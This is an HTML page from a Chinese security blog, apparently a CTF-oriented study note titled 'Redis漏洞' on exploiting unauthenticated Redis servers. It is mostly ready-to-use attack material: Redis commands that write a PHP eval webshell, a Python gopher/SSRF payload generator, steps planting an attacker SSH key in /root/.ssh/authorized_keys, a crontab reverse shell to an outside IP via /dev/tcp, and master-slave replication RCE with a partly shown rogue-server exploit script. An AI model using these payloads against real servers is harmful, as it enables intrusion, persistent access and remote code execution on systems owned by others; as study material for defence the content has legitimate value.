@@ -1,0 +1,666 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8" />
+    <title>Redis漏洞 | 雲流のLowest World</title>
+    <meta name="author" content="C1oudfL0w0" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
+    <!-- cdn挂掉的时候要可以引用本地 -->
+<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
+<script src="/blog/js/vue.global.prod.min.js"></script>
+
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />
+
+
+<link rel="stylesheet" href="/blog/css/all.min.css" />
+<link rel="stylesheet" href="/blog/css/fonts.min.css" />
+<link rel="stylesheet" href="/blog/css/search.css" />
+<script> const mixins = {}; </script>
+
+<!-- 引入jQuery-->
+<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
+<script src="/blog/js/jquery.min.js"></script>
+
+<!--改成了prismjs高亮-->
+
+<script src="/blog/js/lib/prism.js"></script>
+<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />
+
+
+
+<script src="/blog/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/blog/js/lib/home.js"></script>
+
+<link rel="stylesheet" href="/blog/css/main.css" />
+<!-- 引入不蒜子-->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<!-- 引入clipboard -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
+</head>
+
+<body>
+    <!--flag{never_g0nna g1ve_you up}-->
+
+    <!-- 页面点击特效 -->
+    <script type="text/javascript" src="/blog/js/love-click.js"></script>
+
+    <!-- 浏览器标题 -->
+    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>
+
+    <!-- 动态背景 -->
+    
+
+    <!--文章目录-->
+    
+    <div id="toc" class="toc-article">
+    <h3><i class="fas fa-stream"></i>  目录</h3>
+      <div class="toc-title"></div>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%99shell"><span class="toc-number">3.</span> <span class="toc-text">写shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%86%99ssh%E5%85%AC%E9%92%A5"><span class="toc-number">4.</span> <span class="toc-text">未授权访问写ssh公钥</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8contrab%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">5.</span> <span class="toc-text">利用contrab计划任务反弹shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6RCE"><span class="toc-number">6.</span> <span class="toc-text">主从复制RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6"><span class="toc-number">6.1.</span> <span class="toc-text">主从复制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis-module"><span class="toc-number">6.2.</span> <span class="toc-text">Redis module</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-number">6.3.</span> <span class="toc-text">攻击流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%90exp"><span class="toc-number">6.4.</span> <span class="toc-text">某exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF"><span class="toc-number">7.</span> <span class="toc-text">SSRF</span></a></li></ol>
+    </div>
+  
+
+    <!--返回顶部-->
+    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
+        <a title="返回顶部">↑</a>
+    </div>
+    <script src="/blog/js/totop.js"></script>
+
+    <div id="layout">
+        
+            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
+            
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>第一次加载文章图片可能会花费较长时间</p>
+                    <p>要不挂个梯子试试？（x</p>
+                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
+                    <img src="/blog/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <transition name="into">
+            <div id="main" v-show="!loading">
+                <nav id="menu" ref="menu">
+    <div class="desktop-menu">
+        <a class="title" href="/blog/">
+            <span>雲流のLOWEST WORLD</span>
+        </a>
+        
+        <a href="/blog/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/blog/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/blog/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/blog/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/blog/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+        <a href="/blog/links">
+            <i class="fa-solid fa-link fa-fw"></i>
+            <span>&ensp;Links</span>
+        </a>
+        
+        <a href="/blog/search">
+            <i class="fa-solid fa-search fa-fw"></i>
+            <span>&ensp;Search</span>
+        </a>
+        
+    </div>
+    <div id="mobile-menu">
+        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
+        <div class="title" @click="showMenu = !showMenu">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;雲流のLOWEST WORLD</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="showMenu">
+            
+            <a href="/blog/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                </div>
+            </a>
+            
+            <a href="/blog/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                </div>
+            </a>
+            
+            <a href="/blog/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                </div>
+            </a>
+            
+            <a href="/blog/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                </div>
+            </a>
+            
+            <a href="/blog/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                </div>
+            </a>
+            
+            <a href="/blog/links">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-link fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
+                </div>
+            </a>
+            
+            <a href="/blog/search">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-search fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+
+                <div class="article">
+    <div>
+        <h1>Redis漏洞</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/5/8
+        </span>
+        
+        <span class="category">
+            <a href="/blog/categories/Web/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                Web
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/SSRF/" style="color: #ff7d73">SSRF</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/Redis/" style="color: #00bcd4">Redis</a>
+            </span>
+            
+        </span>
+        
+        <!--文章字数统计-->
+        
+            
+<div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <!-- 安装插件npm install hexo-wordcount --save -->
+        <span class="post-count">2.1k字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">10分</span>
+      </span>
+    </span>
+    
+    <!--不蒜子统计访问数-->
+    <span id="busuanzi_container_page_pv">
+    &nbsp; | &nbsp;
+    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
+    </span>
+</div>
+
+          
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5665">https://xz.aliyun.com/t/5665</a></p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1904134">https://cloud.tencent.com/developer/article/1904134</a></p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1039000">https://cloud.tencent.com/developer/article/1039000</a></p>
+<span id="more"></span>
+
+<hr>
+<h1 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h1><p>能未授权或者能通过弱口令认证等方式访问到 Redis 服务器</p>
+<hr>
+<h1 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h1><p>条件：</p>
+<ul>
+<li>root权限启动redis</li>
+<li>需要知道绝对路径</li>
+<li>具有文件读写增删改查权限</li>
+</ul>
+<p>构造redis命令：</p>
+<pre class="line-numbers language-redis" data-language="redis"><code class="language-redis">redis-cli -h 127.0.0.1:6379     # 连接Redis
+config set dir &#x2F;var&#x2F;www&#x2F;html    # 设置要写入shell的路径
+config set dbfilename shell.php
+set g1ts &quot;\n\n\n&lt;?php @eval($_GET(&quot;cmd&quot;))?&gt;\n\n\n&quot;         # 写入一句话木马到g1ts键
+save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>转化为redis RESP协议的格式的脚本，一般配合gopher协议使用：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib
+protocol<span class="token operator">=</span><span class="token string">"gopher://"</span>
+ip<span class="token operator">=</span><span class="token string">"192.168.163.128"</span>
+port<span class="token operator">=</span><span class="token string">"6379"</span>
+shell<span class="token operator">=</span><span class="token string">"\n\n&lt;?php eval($_GET[\"cmd\"]);?>\n\n"</span>
+filename<span class="token operator">=</span><span class="token string">"shell.php"</span>
+path<span class="token operator">=</span><span class="token string">"/var/www/html"</span>
+passwd<span class="token operator">=</span><span class="token string">""</span>
+cmd<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"flushall"</span><span class="token punctuation">,</span>
+     <span class="token string">"set 1 &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>shell<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">"$&#123;IFS&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+     <span class="token string">"config set dir &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">,</span>
+     <span class="token string">"config set dbfilename &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">,</span>
+     <span class="token string">"save"</span>
+     <span class="token punctuation">]</span>
+<span class="token keyword">if</span> passwd<span class="token punctuation">:</span>
+    cmd<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"AUTH &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span><span class="token punctuation">)</span>
+payload<span class="token operator">=</span>protocol<span class="token operator">+</span>ip<span class="token operator">+</span><span class="token string">":"</span><span class="token operator">+</span>port<span class="token operator">+</span><span class="token string">"/_"</span>
+<span class="token keyword">def</span> <span class="token function">redis_format</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    CRLF<span class="token operator">=</span><span class="token string">"\r\n"</span>
+    redis_arr <span class="token operator">=</span> arr<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span>
+    cmd<span class="token operator">=</span><span class="token string">""</span>
+    cmd<span class="token operator">+=</span><span class="token string">"*"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>redis_arr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">for</span> x <span class="token keyword">in</span> redis_arr<span class="token punctuation">:</span>
+        cmd<span class="token operator">+=</span>CRLF<span class="token operator">+</span><span class="token string">"$"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"$&#123;IFS&#125;"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>CRLF<span class="token operator">+</span>x<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"$&#123;IFS&#125;"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span>
+    cmd<span class="token operator">+=</span>CRLF
+    <span class="token keyword">return</span> cmd
+
+<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> x <span class="token keyword">in</span> cmd<span class="token punctuation">:</span>
+        payload <span class="token operator">+=</span> urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>redis_format<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span> payload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>具体攻击过程可参考：<a href="">ctfshow2025元旦渗透赛 第五章 功亏一篑</a></p>
+<hr>
+<h1 id="未授权访问写ssh公钥"><a href="#未授权访问写ssh公钥" class="headerlink" title="未授权访问写ssh公钥"></a>未授权访问写ssh公钥</h1><p>条件：</p>
+<ul>
+<li>Redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网</li>
+<li>没有设置密码认证（一般为空），可以免密码远程登录redis服务</li>
+</ul>
+<p>先本地产生公私钥文件：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh-keygen –t rsa
+<span class="token punctuation">(</span>echo <span class="token parameter variable">-e</span> <span class="token string">"  "</span><span class="token punctuation">;</span> <span class="token function">cat</span> id_rsa.pub<span class="token punctuation">;</span> <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"  "</span><span class="token punctuation">)</span> <span class="token operator">></span> foo.txt
+<span class="token function">cat</span> foo.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>把得到的私钥填进payload：（写入的目录不限于 &#x2F;root&#x2F;.ssh 下的 authorized_keys，也可以写入用户目录，不过Redis很多以root权限运行，所以写入root目录下，可以跳过猜用户的步骤）</p>
+<pre class="line-numbers language-redis" data-language="redis"><code class="language-redis">flushall
+set 1 &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC&#x2F;PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR&#x2F;BSq30ixoAT1vKKYMp8+8&#x2F;eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F&#x2F;3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali
+&#39;
+config set dir &#x2F;root&#x2F;.ssh&#x2F;
+config set dbfilename authorized_keys
+save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后把前面的python脚本改一下：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">filename<span class="token operator">=</span><span class="token string">"authorized_keys"</span>
+ssh_pub<span class="token operator">=</span><span class="token string">"\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali\n\n"</span>
+path<span class="token operator">=</span><span class="token string">"/root/.ssh/"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>即可远程利用自己的私钥登录服务器</p>
+<hr>
+<h1 id="利用contrab计划任务反弹shell"><a href="#利用contrab计划任务反弹shell" class="headerlink" title="利用contrab计划任务反弹shell"></a>利用contrab计划任务反弹shell</h1><p>条件：</p>
+<p>只能在 Centos 上使用，Ubuntu上用不了，原因：</p>
+<ol>
+<li>因为默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件<code>/var/spool/cron/crontabs/&lt;username&gt;</code>权限必须是600也就是<code>-rw-------</code>才会执行，否则会报错<code>(root) INSECURE MODE (mode 0600 expected)</code>，而Centos的定时任务文件<code>/var/spool/cron/&lt;username&gt;</code>权限644也能执行</li>
+<li>因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错</li>
+</ol>
+<p>由于系统的不同，crontrab定时文件位置也会不同：</p>
+<ul>
+<li><p>Centos的定时任务文件在<code>/var/spool/cron/&lt;username&gt;</code></p>
+</li>
+<li><p>Ubuntu定时任务文件在<code>/var/spool/cron/crontabs/&lt;username&gt;</code></p>
+</li>
+<li><p>Centos和Ubuntu均存在的（需要root权限）<code>/etc/crontab</code> PS：高版本的redis默认启动是<code>redis</code>权限，故写这个文件是行不通的</p>
+</li>
+</ul>
+<p>payload：</p>
+<pre class="line-numbers language-redis" data-language="redis"><code class="language-redis">flushall
+set 1 &#39;\n\n*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.163.132&#x2F;2333 0&gt;&amp;1\n\n&#39;
+config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;
+config set dbfilename root
+save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>同样修改python脚本：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">reverse_ip<span class="token operator">=</span><span class="token string">"192.168.163.132"</span>
+reverse_port<span class="token operator">=</span><span class="token string">"2333"</span>
+cron<span class="token operator">=</span><span class="token string">"\n\n\n\n*/1 * * * * bash -i >&amp; /dev/tcp/%s/%s 0>&amp;1\n\n\n\n"</span><span class="token operator">%</span><span class="token punctuation">(</span>reverse_ip<span class="token punctuation">,</span>reverse_port<span class="token punctuation">)</span>
+filename<span class="token operator">=</span><span class="token string">"root"</span>
+path<span class="token operator">=</span><span class="token string">"/var/spool/cron"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h1 id="主从复制RCE"><a href="#主从复制RCE" class="headerlink" title="主从复制RCE"></a>主从复制RCE</h1><h2 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h2><blockquote>
+<p>主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。</p>
+</blockquote>
+<p>前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。</p>
+<p>redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中，但是如果硬盘的数据被删除的话数据就无法恢复了，如果通过主从复制就能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据是就会通过主从复制复制到其它从redis</p>
+<p><img src="/blog/2024/05/08/Redis%E6%BC%8F%E6%B4%9E/image-20240509110225719.png" alt="image-20240509110225719"></p>
+<p>建立主从复制，有3种方式：（<strong>建立主从关系只需要在从节点操作就行了，主节点不用任何操作</strong>）</p>
+<ol>
+<li>配置文件写入：<code>slaveof &lt;master_ip&gt; &lt;master_port&gt;</code></li>
+<li>redis-server启动命令后加入：<code>--slaveof &lt;master_ip&gt; &lt;master_port&gt;</code></li>
+<li>连接到客户端之后执行：<code>slaveof &lt;master_ip&gt; &lt;master_port&gt;</code></li>
+</ol>
+<p>本地测试：</p>
+<p>我们先在同一个机器开两个redis实例，一个端口为6379，一个端口为6380</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">redis-server
+redis-server D:<span class="token punctuation">\</span>Redis<span class="token punctuation">\</span>Redis-x64-5.0.14.1<span class="token punctuation">\</span>redis6380.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>把 master_ip 设置为<code>127.0.0.1</code>，master_port 为<code>6380</code></p>
+<pre class="line-numbers language-redis" data-language="redis"><code class="language-redis">redis-cli -p 6379
+127.0.0.1:6379&gt; SLAVEOF 127.0.0.1 6380
+OK
+127.0.0.1:6379&gt; get test
+(nil)
+127.0.0.1:6379&gt; exit
+
+redis-cli -p 6380
+127.0.0.1:6380&gt; get test
+(nil)
+127.0.0.1:6380&gt; set test &quot;test&quot;
+OK
+127.0.0.1:6380&gt; get test
+&quot;test&quot;
+127.0.0.1:6380&gt; exit
+
+redis-cli -p 6379
+127.0.0.1:6379&gt; get test
+&quot;test&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以看到数据达到了同步效果，如果我们想解除主从关系可以执行<code>SLAVEOF NO ONE</code></p>
+<hr>
+<h2 id="Redis-module"><a href="#Redis-module" class="headerlink" title="Redis module"></a>Redis module</h2><p>Redis4.x之后redis新增了一个模块功能，Redis模块可以使用外部模块扩展Redis功能，以一定的速度实现新的Redis命令，并具有类似于核心内部可以完成的功能</p>
+<p>Redis模块是动态库，可以在启动时或使用<code>MODULE LOAD</code>命令加载到Redis中</p>
+<p>恶意so文件：<a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">python3 <span class="token punctuation">.</span><span class="token operator">/</span>redis<span class="token operator">-</span>rogue<span class="token operator">-</span>server<span class="token punctuation">.</span>py <span class="token operator">-</span><span class="token operator">-</span>rhost <span class="token number">192.168</span><span class="token number">.200</span><span class="token number">.38</span> <span class="token operator">-</span><span class="token operator">-</span>lhost <span class="token number">192.168</span><span class="token number">.200</span><span class="token number">.4</span> <span class="token operator">-</span><span class="token operator">-</span>exp <span class="token punctuation">.</span><span class="token operator">/</span>exp<span class="token punctuation">.</span>so <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>有两种模式，一种是交互式shell，一种是反弹shell</p>
+<hr>
+<h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><ol>
+<li><p>配置一个我们需要以master身份给slave传输so文件的服务</p>
+<pre class="line-numbers language-redis" data-language="redis"><code class="language-redis">PING 测试连接是否可用
++PONG 告诉slave连接可用
+REPLCONF 发送REPLCONF信息，主要是当前实例监听端口
++OK 告诉slave成功接受
+REPLCONF 发送REPLCONF capa
++OK 告诉slave成功接受
+PSYNC &lt;rundi&gt; &lt;offest&gt; 发送PSYNC<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+</li>
+<li><p>将要攻击的redis服务器设置成我们的slave</p>
+<pre class="line-numbers language-redis" data-language="redis"><code class="language-redis">SLAVEOF ip port<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+<li><p>设置RDB文件（注意以下exp.so是不能包含路径的，如果需要设置成其它目录请用<code>config set dir path</code>）</p>
+<pre class="line-numbers language-redis" data-language="redis"><code class="language-redis">config set dbfilename exp.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+<li><p>告诉slave使用全量复制并从我们配置的Rouge Server接收module（其中<code>&lt;runid&gt;</code>无要求，不过长度一般为40，<code>&lt;offest&gt;</code>一般设置为1）</p>
+<pre class="line-numbers language-redis" data-language="redis"><code class="language-redis">+FULLRESYNC &lt;runid&gt; &lt;offest&gt;\r\n$&lt;len(payload)&gt;\r\n&lt;payload&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+</ol>
+<hr>
+<h2 id="某exp"><a href="#某exp" class="headerlink" title="某exp"></a>某exp</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket
+<span class="token keyword">import</span> time
+
+CRLF<span class="token operator">=</span><span class="token string">"\r\n"</span>
+payload<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"exp.so"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+exp_filename<span class="token operator">=</span><span class="token string">"exp.so"</span>
+
+<span class="token keyword">def</span> <span class="token function">redis_format</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">global</span> CRLF
+    <span class="token keyword">global</span> payload
+    redis_arr<span class="token operator">=</span>arr<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span>
+    cmd<span class="token operator">=</span><span class="token string">""</span>
+    cmd<span class="token operator">+=</span><span class="token string">"*"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>redis_arr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">for</span> x <span class="token keyword">in</span> redis_arr<span class="token punctuation">:</span>
